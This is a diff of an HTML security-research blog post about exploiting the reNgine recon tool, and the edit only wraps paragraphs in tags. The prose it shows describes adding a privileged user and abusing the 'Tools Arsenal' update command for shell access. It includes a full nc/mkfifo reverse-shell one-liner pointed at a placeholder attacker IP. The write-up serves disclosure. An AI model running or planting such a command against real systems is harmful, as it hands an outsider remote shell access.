@@ -45,16 +45,16 @@ categories: [security-research]
     <img src="/img/posts/2022-06-17-hacking-the-hackers-rengine-edition/8.%20user%20insert.png" alt="" width="840"
         height="96" />
 
-    If we see the data from the table again, we can see a new user has been added with
+    <p>If we see the data from the table again, we can see a new user has been added with
     highest level of privileges.
-    Now, we can login to the reNgine dashboard with the new credentials.
+    Now, we can login to the reNgine dashboard with the new credentials.</p>
     <img src="/img/posts/2022-06-17-hacking-the-hackers-rengine-edition/10.%20logging%20in.png" alt="" width="354"
         height="355" />
 
-    Can we do more? Yes, we can. We can use one of the intended feature of reNgine to get
+    <p>Can we do more? Yes, we can. We can use one of the intended feature of reNgine to get
     shell access to the container. The feature we are leveraging here is the "Tools Arsenal" section. We can add a
     custom tool in reNgine and give commands to execute. We add a custom tool with the following line in the update
-    command:
+        command:</p>
     <pre
         <code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc &lt;ATTACKER_IP&gt; &lt;ATTACKER PORT&gt; &gt;/tmp/f</code></pre>
     Then, listen for an incoming connection and click on "Check Update" button for the
